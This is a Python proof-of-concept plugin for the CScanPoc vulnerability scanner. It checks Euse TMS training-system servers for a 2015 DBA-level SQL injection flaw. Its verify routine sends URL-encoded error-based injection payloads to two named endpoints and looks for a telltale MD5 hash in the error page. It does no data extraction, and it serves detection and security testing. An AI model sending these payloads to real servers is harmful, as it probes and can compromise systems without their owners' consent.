# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Euse_TMS_0009' # 平台漏洞编号，留空
    name = '易用在线培训系统存在DBA权限SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-11-19'  # 漏洞公布时间
    desc = '''
        Euse TMS(易用在线培训系统)存在两处DBA权限SQL注入漏洞：
        /repoort/smartuser.aspx?di=1
        /Plan/plancommentlist.aspx?type=3&targetid=1
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0135012
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'Euse TMS(易用在线培训系统)'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aa9a48c8-874a-4b89-ba3f-56ea78d783eb'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps=[
                "/repoort/smartuser.aspx?di=1%27%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))=0%20and%20%27%%27=%27%",
                "/Plan/plancommentlist.aspx?type=3&targetid=1%27%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))=0%20and%20%27%%27=%27%"
                ]
            for p in ps:
                url=arg+p
                code, head, res, errcode, _ = hh.http(url)
                if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()